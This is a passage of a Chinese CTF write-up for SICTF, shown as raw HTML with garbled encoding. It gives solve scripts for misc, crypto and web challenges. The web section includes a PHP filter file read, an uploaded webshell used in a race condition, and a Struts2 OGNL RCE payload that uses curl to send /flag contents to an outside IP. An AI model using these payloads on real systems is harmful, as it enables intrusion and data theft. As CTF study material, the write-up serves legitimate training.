title="Easy_Shark"></a>Easy_Shark</h3><p>å†°èæµé‡ï¼Œç…§ç€ç¬¬ä¸€ä¸ªæµçš„PHPåŠ å¯†é€»è¾‘ä»£ç è¿˜åŸï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;2295d22e2d70888f&quot;</span>;</span><br><span class="line">    <span class="variable">$post</span>=<span class="string">&quot;...&quot;</span>;</span><br><span class="line"><span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">json_decode</span>(<span class="variable">$post</span>, <span class="literal">true</span>)[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°†å“åº”æ•°æ®åŒ…ä¸­çš„base64å­—ç¬¦ä¸²å¸¦å…¥å¾—åˆ°å„æµçš„è§£å¯†å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GronKey.txt</span><br><span class="line">dvwa_email.png</span><br><span class="line">flag.txt</span><br><span class="line">shell.php</span><br><span class="line"></span><br><span class="line"># flag.txt</span><br><span class="line">TGLBOMSJNSRAJAZDEZXGHSJNZWHG</span><br><span class="line"></span><br><span class="line"># GronKey.txt</span><br><span class="line">1,50,61,8,9,20,63,41</span><br></pre></td></tr></table></figure><p>GronsfeldåŠ å¯†ï¼Œæ›¿æ¢æˆVigenereåŠ å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">1</span>,<span class="number">50</span>,<span class="number">61</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">20</span>,<span class="number">63</span>,<span class="number">41</span>]</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">dic = string.ascii_lowercase</span><br><span class="line">key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">    key += dic[k%<span class="number">26</span>]</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># byjijulp</span></span><br></pre></td></tr></table></figure><p>Vigenereè§£å¯†ï¼Œå¾— <code>SICTFSHUMUISAGOODBOYYYYYYYYY</code>ã€‚</p><p>flagï¼š<code>SICTF&#123;SHUMUISAGOODBOYYYYYYYYY&#125;</code></p><p>â€‹    </p><h3 id="fast-morse"><a href="#fast-morse" class="headerlink" title="fast_morse"></a>fast_morse</h3><p>audacityè°ƒæ…¢é€Ÿåº¦ï¼Œå†<a href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html">åœ¨çº¿è¯†åˆ«morse</a>ï¼Œå¾—åˆ° <code>f2a09bf-7f4a-4269-93a5-c8a48360b03c</code>ã€‚</p><p>â€‹    </p><h3 id="QR-QR-QR"><a href="#QR-QR-QR" class="headerlink" title="QR_QR_QR"></a>QR_QR_QR</h3><p>äº¤äº’å¼01å­—ç¬¦ä¸²è¿˜åŸäºŒç»´ç ï¼Œä¸”æäº†1000å±‚â€¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;210.44.151.51&#x27;</span>,<span class="number">10144</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    x = r.recvuntil(<span class="string">b&#x27;Please&#x27;</span>)[:-<span class="number">7</span>].split(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    MAX = <span class="built_in">len</span>(x)</span><br><span class="line">    pic = Image.new(<span class="string">&quot;RGB&quot;</span>,(MAX,MAX))</span><br><span class="line">    s = <span class="string">b&#x27;&#x27;</span>.join(x)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,MAX):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,MAX):</span><br><span class="line">            <span class="keyword">if</span>(s[i] == <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>)):</span><br><span class="line">                pic.putpixel((x,y),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                pic.putpixel((x,y),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">            i = i+<span class="number">1</span></span><br><span class="line">    pic.save(<span class="string">&quot;flag.png&quot;</span>)</span><br><span class="line"></span><br><span class="line">    decocdeQR = decode(Image.<span class="built_in">open</span>(<span class="string">&quot;flag.png&quot;</span>))</span><br><span class="line">    data = decocdeQR[<span class="number">0</span>].data</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    </span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;code:&#x27;</span>,data)</span><br><span class="line">    <span class="built_in">print</span>(r.recvline())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="é—®å·è°ƒæŸ¥"><a href="#é—®å·è°ƒæŸ¥" class="headerlink" title="é—®å·è°ƒæŸ¥"></a>é—®å·è°ƒæŸ¥</h3><p><code>SICTF&#123;SICTF_Round3_will_do_even_better!&#125;</code></p><p>â€‹    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="ç­¾åˆ°-å¤å…¸å¤§æ‚çƒ©"><a href="#ç­¾åˆ°-å¤å…¸å¤§æ‚çƒ©" class="headerlink" title="[ç­¾åˆ°]å¤å…¸å¤§æ‚çƒ©"></a>[ç­¾åˆ°]å¤å…¸å¤§æ‚çƒ©</h3><p>base100-base62-base64-base58-base32-base62</p><p><code>SICTF&#123;fe853b49-8730-462e-86f5-fc8e9789f077&#125;</code></p><p>â€‹    </p><h3 id="Radio"><a href="#Radio" class="headerlink" title="Radio"></a>Radio</h3><p>CRT</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">n1 =   </span><br><span class="line">n2 =   </span><br><span class="line">n3 =   </span><br><span class="line">c1 =     </span><br><span class="line">c2 =   </span><br><span class="line">c3 =  </span><br><span class="line">e = <span class="number">17</span></span><br><span class="line"></span><br><span class="line">mm = crt([c1,c2,c3],[n1,n2,n3])</span><br><span class="line">m = mm.nth_root(e, truncate_mode=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m[<span class="number">0</span>])[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SICTF&#123;fdc0afb5-1c81-46b9-a28a-241f5f64419d&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="MingTianPao"><a href="#MingTianPao" class="headerlink" title="MingTianPao"></a>MingTianPao</h3><p>MTP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Crypto.Util.strxor <span class="keyword">as</span> xo</span><br><span class="line"><span class="keyword">import</span> libnum, codecs, numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isChr</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x <span class="keyword">and</span> x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infer</span>(<span class="params">index, pos</span>):</span><br><span class="line">    <span class="keyword">if</span> msg[index, pos] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">know</span>(<span class="params">index, pos, ch</span>):</span><br><span class="line">    msg[index, pos] = <span class="built_in">ord</span>(ch)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="built_in">ord</span>(ch)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dat = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSpace</span>():</span><br><span class="line">    <span class="keyword">for</span> index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(c):</span><br><span class="line">        res = [xo.strxor(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> c <span class="keyword">if</span> x!=y]</span><br><span class="line">        f = <span class="keyword">lambda</span> pos: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(isChr, [s[pos] <span class="keyword">for</span> s <span class="keyword">in</span> res])))</span><br><span class="line">        cnt = [f(pos) <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            dat.append((f(pos), index, pos))</span><br><span class="line"></span><br><span class="line">c = [codecs.decode(x.strip().encode(), <span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;Problem.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()]</span><br><span class="line"></span><br><span class="line">msg = np.zeros([<span class="built_in">len</span>(c), <span class="built_in">len</span>(c[<span class="number">0</span>])], dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">getSpace()</span><br><span class="line"></span><br><span class="line">dat = <span class="built_in">sorted</span>(dat)[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> w, index, pos <span class="keyword">in</span> dat:</span><br><span class="line">    infer(index, pos)</span><br><span class="line"></span><br><span class="line">know(<span class="number">1</span>, <span class="number">28</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">know(<span class="number">1</span>, <span class="number">24</span>, <span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">know(<span class="number">1</span>, <span class="number">16</span>, <span class="string">&#x27;t&#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">10</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">know(<span class="number">0</span>, <span class="number">12</span>, <span class="string">&#x27;i&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> x]) <span class="keyword">for</span> x <span class="keyword">in</span> msg]))</span><br><span class="line"></span><br><span class="line">key = xo.strxor(c[<span class="number">0</span>], <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> msg[<span class="number">0</span>]]).encode())</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Little Red Riding Hood promise</span></span><br><span class="line"><span class="comment"># d to obey her mother. The gran</span></span><br><span class="line"><span class="comment"># dmother lived out in the woods</span></span><br><span class="line"><span class="comment"># , a half hour from the village</span></span><br><span class="line"><span class="comment"># . When Little Red Riding Hood </span></span><br><span class="line"><span class="comment"># entered the woods a wolf came </span></span><br><span class="line"><span class="comment"># up to her. She did not know wh</span></span><br><span class="line"><span class="comment"># at a wicked animal he was, and</span></span><br><span class="line"><span class="comment">#  was not afraid of him. &quot;Good </span></span><br><span class="line"><span class="comment"># day to you, Little Red Riding </span></span><br><span class="line"><span class="comment"># b&#x27;SICTF&#123;MTP_AtTack_is_w0nderFu1&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Easy-CopperSmith"><a href="#Easy-CopperSmith" class="headerlink" title="Easy_CopperSmith"></a>Easy_CopperSmith</h3><p>coppersmithè§£å·²çŸ¥pé«˜ä½æ”»å‡»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">ph =  </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (ph &lt;&lt; <span class="number">230</span>) + x</span><br><span class="line">pl = f.small_roots(X=<span class="number">2</span>^<span class="number">230</span>, beta=<span class="number">0.48</span>, epsilon=<span class="number">0.02</span>)[<span class="number">0</span>]</span><br><span class="line">p = (ph &lt;&lt; <span class="number">230</span>) + pl</span><br><span class="line"></span><br><span class="line">q = n//<span class="built_in">int</span>(p)</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SICTF&#123;3f9366ed-b8e4-412f-bbd0-62616a24115c&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ç­¾åˆ°é¢˜æ¥å’¯ï¼"><a href="#ç­¾åˆ°é¢˜æ¥å’¯ï¼" class="headerlink" title="ç­¾åˆ°é¢˜æ¥å’¯ï¼"></a>ç­¾åˆ°é¢˜æ¥å’¯ï¼</h3><p>Related Message Attackï¼ˆFranklin-Reiteræ”»å‡»ï¼‰ï¼Œçˆ†ç ´å° $e$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">c1 = </span><br><span class="line">c2 = </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">c1, c2, n, e</span>):</span><br><span class="line">    PR.&lt;x&gt;=PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = (<span class="number">114</span>*x+<span class="number">2333</span>)^e - c1</span><br><span class="line">    g2 = (<span class="number">514</span>*x+<span class="number">4555</span>)^e - c2</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1, g2</span>):</span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">e = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> e &lt; <span class="number">2</span>^<span class="number">10</span>:</span><br><span class="line">    m = attack(c1, c2, n, e)</span><br><span class="line">    m = binascii.unhexlify(<span class="string">&quot;%x&quot;</span> % <span class="built_in">int</span>(m))</span><br><span class="line">    <span class="keyword">if</span> m.isascii():</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    e = next_prime(e)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># SICTF&#123;hhh!!franklin_reiter_is_easy&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="small-e"><a href="#small-e" class="headerlink" title="small_e"></a>small_e</h3><p>ç›´æ¥å° $e$ æ”»å‡»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = </span><br><span class="line">m = gmpy2.iroot(c,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SICTF&#123;2ca8e589-4a31-4909-80f0-9ecfc8f8cb37&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="easy-math"><a href="#easy-math" class="headerlink" title="easy_math"></a>easy_math</h3><p>æ ¹æ®</p><p>$\begin{cases} h_1=a_1p+b_1q \newline h_2=a_2p+b_2q \end{cases}$</p><p>æ¶ˆæ‰ $p$ï¼Œæœ‰ $(a_2b_1-a_1b_2)q=a_2h_1-a_1h_2$ï¼Œç”±äº $a_1,a_2$ ä¸ºç´ æ•°ä¸” $a_1,a_2 \in [2^{12},2^{13})$ï¼Œåˆ $\gcd(a_2h_1-a_1h_2,n)=q$ï¼Œçˆ†ç ´ $a_1,a_2$ å³å¯æ±‚ $q$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">h1 = </span><br><span class="line">h2 = </span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">primes = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> Primes():</span><br><span class="line">    <span class="keyword">if</span> k&gt;=<span class="number">2</span>^<span class="number">12</span>:</span><br><span class="line">        primes.append(k)</span><br><span class="line">    <span class="keyword">if</span> k&gt;<span class="number">2</span>^<span class="number">13</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(primes)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(primes)):</span><br><span class="line">        x = <span class="built_in">abs</span>(h1*primes[i]-h2*primes[j])</span><br><span class="line">        q = gcd(x,n)</span><br><span class="line">        <span class="keyword">if</span> q &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(primes[i],primes[j],q)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5953 4241 8358483529150257619757085065272214074629139403939506404958882156637928949429486966229697771519458532207667137987443291952917150640467328461391364839768437</span></span><br></pre></td></tr></table></figure><p>å¸¸è§„è§£RSAï¼Œå¾—flagï¼š<code>SICTF&#123;452aebb6-9c16-441a-ac42-fc608bf6063f&#125;</code></p><p>â€‹    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ç­¾åˆ°-Include"><a href="#ç­¾åˆ°-Include" class="headerlink" title="[ç­¾åˆ°]Include"></a>[ç­¾åˆ°]Include</h3><p>PHPä¼ªåè®®è¯» <code>/flag</code>ï¼š</p><p><code>?SICTF=php://filter/resource=/flag</code></p><p>â€‹    </p><h3 id="Baby-PHP"><a href="#Baby-PHP" class="headerlink" title="Baby_PHP"></a>Baby_PHP</h3><p>POST <code>/?k%20e%20y=123%0a&amp;b=phpinfo();</code></p><p><code>command=print_r(file_get_contents(array_rand(array_flip(scandir(current(localeconv()))))));</code></p><p>â€‹    </p><h3 id="ä½ èƒ½è·Ÿå¾—ä¸Šæˆ‘çš„speedå—"><a href="#ä½ èƒ½è·Ÿå¾—ä¸Šæˆ‘çš„speedå—" class="headerlink" title="ä½ èƒ½è·Ÿå¾—ä¸Šæˆ‘çš„speedå—"></a>ä½ èƒ½è·Ÿå¾—ä¸Šæˆ‘çš„speedå—</h3><p>æ¡ä»¶ç«äº‰ã€‚</p><p>ä¸Šä¼  <code>1.php</code> ï¼Œå†…å®¹ä¸º <code>&lt;?php system(&quot;cat /flag&quot;);</code>ï¼ŒbpæŠ“åŒ…ï¼›è®¿é—® <code>uploads/1.php</code> ï¼ŒbpæŠ“åŒ…ã€‚</p><p>ä¸Šé¢ä¸¤ä¸ªåŒ…åˆ†åˆ«åœ¨bp intruderç”¨null payloadsçˆ†ç ´1000æ¬¡ï¼Œæ‰¾åˆ° <code>uploads/1.php</code> çˆ†ç ´ç»“æœä¸­å“åº”ç 200çš„é‚£ä¸ªæ•°æ®åŒ…ï¼Œå³ä¸ºflagå€¼ã€‚</p><p>â€‹    </p><h3 id="pain"><a href="#pain" class="headerlink" title="pain"></a>pain</h3><p>Struts2åŸºäºOGNLçš„RCEæ¼æ´ï¼Œå‚è€ƒ<a href="https://www.freebuf.com/vuls/217482.html">https://www.freebuf.com/vuls/217482.html</a></p><p>S2-012çš„payloadå¯ç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;curl http://[IP]:[PORT]/?p=`cat /flag`&quot;</span>&#125;)).start()</span><br></pre></td></tr></table></figure><p>unicodeç¼–ç ç»•è¿‡é»‘åå•å…³é”®å­—è¿‡æ»¤ï¼Œå†æ ¹æ®æºç çš„urldecodeï¼Œurlencodeä¸€å±‚ï¼Œpayloadï¼š</p><p><code>/start?payload=%5Cu0028%5Cu006e%5Cu0065%5Cu0077%5Cu0020%5Cu006a%5Cu0061%5Cu0076%5Cu0061%5Cu002e%5Cu006c%5Cu0061%5Cu006e%5Cu0067%5Cu002e%5Cu0050%5Cu0072%5Cu006f%5Cu0063%5Cu0065%5Cu0073%5Cu0073%5Cu0042%5Cu0075%5Cu0069%5Cu006c%5Cu0064%5Cu0065%5Cu0072%5Cu0028%5Cu006e%5Cu0065%5Cu0077%5Cu0020%5Cu006a%5Cu0061%5Cu0076%5Cu0061%5Cu002e%5Cu006c%5Cu0061%5Cu006e%5Cu0067%5Cu002e%5Cu0053%5Cu0074%5Cu0072%5Cu0069%5Cu006e%5Cu0067%5Cu005b%5Cu005d%5Cu007b%5Cu0022%5Cu0062%5Cu0061%5Cu0073%5Cu0068%5Cu0022%5Cu002c%5Cu0020%5Cu0022%5Cu002d%5Cu0063%5Cu0022%5Cu002c%5Cu0020%5Cu0022%5Cu0063%5Cu0075%5Cu0072%5Cu006c%5Cu0020%5Cu0068%5Cu0074%5Cu0074%5Cu0070%5Cu003a%5Cu002f%5Cu002f%5Cu0031%5Cu0032%5Cu0030%5Cu002e%5Cu0032%5Cu0035%5Cu002e%5Cu0031%5Cu0030%5Cu0034%5Cu002e%5Cu0032%5Cu0030%5Cu0039%5Cu003a%5Cu0038%5Cu0038%5Cu0038%5Cu0038%5Cu002f%5Cu003f%5Cu0070%5Cu003d%5Cu0060%5Cu0063%5Cu0061%5Cu0074%5Cu0020%5Cu002f%5Cu0066%5Cu006c%5Cu0061%5Cu0067%5Cu0060%5Cu0022%5Cu007d%5Cu0029%5Cu0029%5Cu002e%5Cu0073%5Cu0074%5Cu0061%5Cu0072%5Cu0074%5Cu0028%5Cu0029</code></p><p>å¾—åˆ°ç»“æœï¼š</p><p><code>210.44.151.51 - - [09/Sep/2023 12:30:07] &quot;GET /?p=SICTF169e8299-2241-4b2e-9726-1c32f212ca51 HTTP/1.1&quot; 200 -</code></p><p>â€‹    </p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>POST <code>/</code></p><p><code>code=include &quot;/flag&quot;;</code></p><p>â€‹    </p><h3 id="æˆ‘å…¨éƒ½è¦"><a href="#æˆ‘å…¨éƒ½è¦" class="headerlink" title="æˆ‘å…¨éƒ½è¦"></a>æˆ‘å…¨éƒ½è¦</h3><p>å†™ååºåˆ—åŒ–é“¾ï¼š</p><figure class="highlight python"><table><tr><td 